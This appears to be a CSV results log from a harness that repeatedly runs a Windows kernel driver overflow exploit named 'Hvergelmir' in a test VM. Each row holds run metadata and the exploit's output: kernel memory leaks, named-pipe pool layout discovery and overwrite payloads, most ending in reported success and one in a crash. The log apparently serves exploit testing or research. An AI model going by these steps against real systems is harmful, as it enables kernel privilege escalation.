<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:45+00:00,2,39,31,running,running,True,success,0,3.515,True,True,2,1.5,1,2,2,1,"] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=26 capture=0 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [000002A316A15CD0]  42536F490A100000  2B6FDF6267EF8AED
    [000002A316A15CE0]  D4903CE5BAF84A5D  0000000000000000
    [000002A316A15CF0]  0000000000000000  0000000000000000
    [000002A316A15D00]  42536F490E0D0003  0000000000000000
    [000002A316A15D10]  000000000000000C  FFFF970D711E9690
    [000002A316A15D20]  00000000000003E8  6161616161616161
    [000002A316A15D30]  6161616161616161  6161616161616161
    [000002A316A15D40]  6161616161616161  6161616161616161
    [000002A316A15D50]  6161616161616161  6161616161616161
    [000002A316A15D60]  6161616161616161  6161616161616161
    [000002A316A15D70]  6161616161616161  6161616161616161
    [000002A316A15D80]  6161616161616161  6161616161616161
    [000002A316A15D90]  6161616161616161  6161616161616161
    [000002A316A15DA0]  6161616161616161  6161616161616161
    [000002A316A15DB0]  6161616161616161  6161616161616161
    [000002A316A15DC0]  0000000000000000  0000000000000000
    [000002A316A15DD0]  7246704E0A100000  2B6FDF6267EF8BED
    [000002A316A15DE0]  FFFF970D706073E8  FFFF970D706073E8
    [000002A316A15DF0]  0000000000000000  FFFF970D70DCD9A0
    [000002A316A15E00]  000000C000000000  00000000000000C0
    [000002A316A15E10]  0000001A45504950  3939393939393939
    [000002A316A15E20]  3939393939393939  3939393939393939
    [000002A316A15E30]  3939393939393939  3939393939393939
    [000002A316A15E40]  3939393939393939  3939393939393939
    [000002A316A15E50]  3939393939393939  3939393939393939
    [000002A316A15E60]  3939393939393939  3939393939393939
    [000002A316A15E70]  3939393939393939  3939393939393939
    [000002A316A15E80]  3939393939393939  3939393939393939
    [000002A316A15E90]  3939393939393939  3939393939393939
    [000002A316A15EA0]  3939393939393939  3939393939393939
    [000002A316A15EB0]  3939393939393939  3939393939393939
    [000002A316A15EC0]  3939393939393939  3939393939393939
    [000002A316A15ED0]  7246704E0A100000  2B6FDF6267EF8CED
    [000002A316A15EE0]  FFFF970D70E9A1E8  FFFF970D70E9A1E8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002A31698B690]  7246704E0A100000  2B6FDF6267EF8BED
    [000002A31698B6A0]  FFFF970D706073E8  FFFF970D706073E8
    [000002A31698B6B0]  000002A3163FFDE0  FFFF970D70DCD9A0
    [000002A31698B6C0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002A31698B680]  0000000000000000  0000000000000000
    [000002A31698B690]  7246704E0A100000  2B6FDF6267EF8BED
    [000002A31698B6A0]  FFFF970D706073E8  FFFF970D706073E8
    [000002A31698B6B0]  000002A3163FFDE0  FFFF970D70DCD9A0
    [000002A31698B6C0]  000000C000000001  00000000000000C0
    [000002A31698B6D0]  0000001A45504950  3939393939393939
    [000002A31698B6E0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:42:59+00:00,2,40,32,running,running,True,success,0,12.531,True,True,3,2.0,1,3,3,1,"oSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 2 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=604 NpFr=704 pipeBase=700 pipeIndex=13 capture=0 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [000002BFABDB9E60]  42536F490A100000  2B6FDF62625AF4ED
    [000002BFABDB9E70]  D4903CE5BAA9C45D  0000000000000000
    [000002BFABDB9E80]  0000000000000000  0000000000000000
    [000002BFABDB9E90]  42536F490E0D0003  0000000000000000
    [000002BFABDB9EA0]  000000000000000C  FFFF970D711EDDA0
    [000002BFABDB9EB0]  00000000000003E8  6161616161616161
    [000002BFABDB9EC0]  6161616161616161  6161616161616161
    [000002BFABDB9ED0]  6161616161616161  6161616161616161
    [000002BFABDB9EE0]  6161616161616161  6161616161616161
    [000002BFABDB9EF0]  6161616161616161  6161616161616161
    [000002BFABDB9F00]  6161616161616161  6161616161616161
    [000002BFABDB9F10]  6161616161616161  6161616161616161
    [000002BFABDB9F20]  6161616161616161  6161616161616161
    [000002BFABDB9F30]  6161616161616161  6161616161616161
    [000002BFABDB9F40]  6161616161616161  6161616161616161
    [000002BFABDB9F50]  0000000000000000  0000000000000000
    [000002BFABDB9F60]  7246704E0A100000  2B6FDF62625AF5ED
    [000002BFABDB9F70]  FFFF970D70E10628  FFFF970D70E10628
    [000002BFABDB9F80]  0000000000000000  FFFF970D709D5700
    [000002BFABDB9F90]  000000C000000000  00000000000000C0
    [000002BFABDB9FA0]  0000000D45504950  3939393939393939
    [000002BFABDB9FB0]  3939393939393939  3939393939393939
    [000002BFABDB9FC0]  3939393939393939  3939393939393939
    [000002BFABDB9FD0]  3939393939393939  3939393939393939
    [000002BFABDB9FE0]  3939393939393939  3939393939393939
    [000002BFABDB9FF0]  3939393939393939  3939393939393939
    [000002BFABDBA000]  3939393939393939  3939393939393939
    [000002BFABDBA010]  3939393939393939  3939393939393939
    [000002BFABDBA020]  3939393939393939  3939393939393939
    [000002BFABDBA030]  3939393939393939  3939393939393939
    [000002BFABDBA040]  3939393939393939  3939393939393939
    [000002BFABDBA050]  3939393939393939  3939393939393939
    [000002BFABDBA060]  7246704E0A100000  2B6FDF62625AF6ED
    [000002BFABDBA070]  FFFF970D7163A1A8  FFFF970D7163A1A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002BFABDBA0D0]  7246704E0A100000  2B6FDF62625AF5ED
    [000002BFABDBA0E0]  FFFF970D70E10628  FFFF970D70E10628
    [000002BFABDBA0F0]  000002BFABB12940  FFFF970D709D5700
    [000002BFABDBA100]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002BFABDBA0C0]  0000000000000000  0000000000000000
    [000002BFABDBA0D0]  7246704E0A100000  2B6FDF62625AF5ED
    [000002BFABDBA0E0]  FFFF970D70E10628  FFFF970D70E10628
    [000002BFABDBA0F0]  000002BFABB12940  FFFF970D709D5700
    [000002BFABDBA100]  000000C000000001  00000000000000C0
    [000002BFABDBA110]  0000000D45504950  3939393939393939
    [000002BFABDBA120]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=12
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:43:04+00:00,2,41,33,running,running,True,success,0,3.563,True,True,31,16.0,1,31,31,1," attempt 30 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 31 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 30 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=304 NpFr=404 pipeBase=400 pipeIndex=21 capture=0 iosbAttempt=30 pipeAttempt=0 pipeLeak=0
    [0000021D5377E460]  42536F490A100000  2B6FDF6265D21CED
    [0000021D5377E470]  D4903CE5B914DC5D  0000000000000000
    [0000021D5377E480]  0000000000000000  0000000000000000
    [0000021D5377E490]  42536F490E0D0003  0000000000000000
    [0000021D5377E4A0]  000000000000000C  FFFF970D711ECF90
    [0000021D5377E4B0]  00000000000003E8  6161616161616161
    [0000021D5377E4C0]  6161616161616161  6161616161616161
    [0000021D5377E4D0]  6161616161616161  6161616161616161
    [0000021D5377E4E0]  6161616161616161  6161616161616161
    [0000021D5377E4F0]  6161616161616161  6161616161616161
    [0000021D5377E500]  6161616161616161  6161616161616161
    [0000021D5377E510]  6161616161616161  6161616161616161
    [0000021D5377E520]  6161616161616161  6161616161616161
    [0000021D5377E530]  6161616161616161  6161616161616161
    [0000021D5377E540]  6161616161616161  6161616161616161
    [0000021D5377E550]  0000000000000000  0000000000000000
    [0000021D5377E560]  7246704E0A100000  2B6FDF6265D21DED
    [0000021D5377E570]  FFFF970D7101C568  FFFF970D7101C568
    [0000021D5377E580]  0000000000000000  FFFF970D70D1BE20
    [0000021D5377E590]  000000C000000000  00000000000000C0
    [0000021D5377E5A0]  0000001545504950  3939393939393939
    [0000021D5377E5B0]  3939393939393939  3939393939393939
    [0000021D5377E5C0]  3939393939393939  3939393939393939
    [0000021D5377E5D0]  3939393939393939  3939393939393939
    [0000021D5377E5E0]  3939393939393939  3939393939393939
    [0000021D5377E5F0]  3939393939393939  3939393939393939
    [0000021D5377E600]  3939393939393939  3939393939393939
    [0000021D5377E610]  3939393939393939  3939393939393939
    [0000021D5377E620]  3939393939393939  3939393939393939
    [0000021D5377E630]  3939393939393939  3939393939393939
    [0000021D5377E640]  3939393939393939  3939393939393939
    [0000021D5377E650]  3939393939393939  3939393939393939
    [0000021D5377E660]  7246704E0A100000  2B6FDF6265D21EED
    [0000021D5377E670]  FFFF970D7101A1C8  FFFF970D7101A1C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000021D5377E240]  7246704E0A100000  2B6FDF6265D21DED
    [0000021D5377E250]  FFFF970D7101C568  FFFF970D7101C568
    [0000021D5377E260]  0000021D532D09B0  FFFF970D70D1BE20
    [0000021D5377E270]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000021D5377E230]  0000000000000000  0000000000000000
    [0000021D5377E240]  7246704E0A100000  2B6FDF6265D21DED
    [0000021D5377E250]  FFFF970D7101C568  FFFF970D7101C568
    [0000021D5377E260]  0000021D532D09B0  FFFF970D70D1BE20
    [0000021D5377E270]  000000C000000001  00000000000000C0
    [0000021D5377E280]  0000001545504950  3939393939393939
    [0000021D5377E290]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=3
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:43:10+00:00,2,42,34,running,running,True,success,0,4.078,True,True,2,1.5,1,2,2,1,"oSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=104 NpFr=204 pipeBase=200 pipeIndex=820 capture=0 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [0000017FA990F390]  42536F490A100000  2B6FDF62647D3AED
    [0000017FA990F3A0]  D4903CE5B914FA5D  0000000000000000
    [0000017FA990F3B0]  0000000000000000  0000000000000000
    [0000017FA990F3C0]  42536F490E0D0003  0000000000000000
    [0000017FA990F3D0]  000000000000000C  FFFF970D711ED080
    [0000017FA990F3E0]  00000000000003E8  6161616161616161
    [0000017FA990F3F0]  6161616161616161  6161616161616161
    [0000017FA990F400]  6161616161616161  6161616161616161
    [0000017FA990F410]  6161616161616161  6161616161616161
    [0000017FA990F420]  6161616161616161  6161616161616161
    [0000017FA990F430]  6161616161616161  6161616161616161
    [0000017FA990F440]  6161616161616161  6161616161616161
    [0000017FA990F450]  6161616161616161  6161616161616161
    [0000017FA990F460]  6161616161616161  6161616161616161
    [0000017FA990F470]  6161616161616161  6161616161616161
    [0000017FA990F480]  0000000000000000  0000000000000000
    [0000017FA990F490]  7246704E0A100000  2B6FDF62647D3BED
    [0000017FA990F4A0]  FFFF970D71604328  FFFF970D71604328
    [0000017FA990F4B0]  0000000000000000  FFFF970D70D08B00
    [0000017FA990F4C0]  000000C000000000  00000000000000C0
    [0000017FA990F4D0]  0000033445504950  3939393939393939
    [0000017FA990F4E0]  3939393939393939  3939393939393939
    [0000017FA990F4F0]  3939393939393939  3939393939393939
    [0000017FA990F500]  3939393939393939  3939393939393939
    [0000017FA990F510]  3939393939393939  3939393939393939
    [0000017FA990F520]  3939393939393939  3939393939393939
    [0000017FA990F530]  3939393939393939  3939393939393939
    [0000017FA990F540]  3939393939393939  3939393939393939
    [0000017FA990F550]  3939393939393939  3939393939393939
    [0000017FA990F560]  3939393939393939  3939393939393939
    [0000017FA990F570]  3939393939393939  3939393939393939
    [0000017FA990F580]  3939393939393939  3939393939393939
    [0000017FA990F590]  7246704E0A100000  2B6FDF62647D3CED
    [0000017FA990F5A0]  FFFF970D7091B488  FFFF970D7091B488
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000017FA986ACE0]  7246704E0A100000  2B6FDF62647D3BED
    [0000017FA986ACF0]  FFFF970D71604328  FFFF970D71604328
    [0000017FA986AD00]  0000017FA92D0A10  FFFF970D70D08B00
    [0000017FA986AD10]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000017FA986ACD0]  0000000000000000  0000000000000000
    [0000017FA986ACE0]  7246704E0A100000  2B6FDF62647D3BED
    [0000017FA986ACF0]  FFFF970D71604328  FFFF970D71604328
    [0000017FA986AD00]  0000017FA92D0A10  FFFF970D70D08B00
    [0000017FA986AD10]  000000C000000001  00000000000000C0
    [0000017FA986AD20]  0000033445504950  3939393939393939
    [0000017FA986AD30]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=3
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:43:15+00:00,2,43,35,running,running,True,success,0,3.656,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=1015 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [000002346608EBE0]  42536F490A100000  2B6FDF6264C6F8ED
    [000002346608EBF0]  D4903CE5B914D85D  0000000000000000
    [000002346608EC00]  0000000000000000  0000000000000000
    [000002346608EC10]  42536F490E0D0003  0000000000000000
    [000002346608EC20]  000000000000000C  FFFF970D711EA920
    [000002346608EC30]  00000000000003E8  6161616161616161
    [000002346608EC40]  6161616161616161  6161616161616161
    [000002346608EC50]  6161616161616161  6161616161616161
    [000002346608EC60]  6161616161616161  6161616161616161
    [000002346608EC70]  6161616161616161  6161616161616161
    [000002346608EC80]  6161616161616161  6161616161616161
    [000002346608EC90]  6161616161616161  6161616161616161
    [000002346608ECA0]  6161616161616161  6161616161616161
    [000002346608ECB0]  6161616161616161  6161616161616161
    [000002346608ECC0]  6161616161616161  6161616161616161
    [000002346608ECD0]  0000000000000000  0000000000000000
    [000002346608ECE0]  7246704E0A100000  2B6FDF6264C6F9ED
    [000002346608ECF0]  FFFF970D70638588  FFFF970D70638588
    [000002346608ED00]  0000000000000000  FFFF970D70DCF9E0
    [000002346608ED10]  000000C000000000  00000000000000C0
    [000002346608ED20]  000003F745504950  3939393939393939
    [000002346608ED30]  3939393939393939  3939393939393939
    [000002346608ED40]  3939393939393939  3939393939393939
    [000002346608ED50]  3939393939393939  3939393939393939
    [000002346608ED60]  3939393939393939  3939393939393939
    [000002346608ED70]  3939393939393939  3939393939393939
    [000002346608ED80]  3939393939393939  3939393939393939
    [000002346608ED90]  3939393939393939  3939393939393939
    [000002346608EDA0]  3939393939393939  3939393939393939
    [000002346608EDB0]  3939393939393939  3939393939393939
    [000002346608EDC0]  3939393939393939  3939393939393939
    [000002346608EDD0]  3939393939393939  3939393939393939
    [000002346608EDE0]  7246704E0A100000  2B6FDF6264C6FAED
    [000002346608EDF0]  FFFF970D71463868  FFFF970D71463868
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000023465FF3470]  7246704E0A100000  2B6FDF6264C6F9ED
    [0000023465FF3480]  FFFF970D70638588  FFFF970D70638588
    [0000023465FF3490]  0000023465A50B30  FFFF970D70DCF9E0
    [0000023465FF34A0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000023465FF3460]  0000000000000000  0000000000000000
    [0000023465FF3470]  7246704E0A100000  2B6FDF6264C6F9ED
    [0000023465FF3480]  FFFF970D70638588  FFFF970D70638588
    [0000023465FF3490]  0000023465A50B30  FFFF970D70DCF9E0
    [0000023465FF34A0]  000000C000000001  00000000000000C0
    [0000023465FF34B0]  000003F745504950  3939393939393939
    [0000023465FF34C0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=3
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:48:48+00:00,2,44,36,running,running,True,crash_or_disconnect,,331.547,False,False,0,,,,,,,,"ReadTimeout(ReadTimeoutError(""HTTPConnectionPool(host='10.10.10.6', port=5985): Read timed out. (read timeout=330)""))"
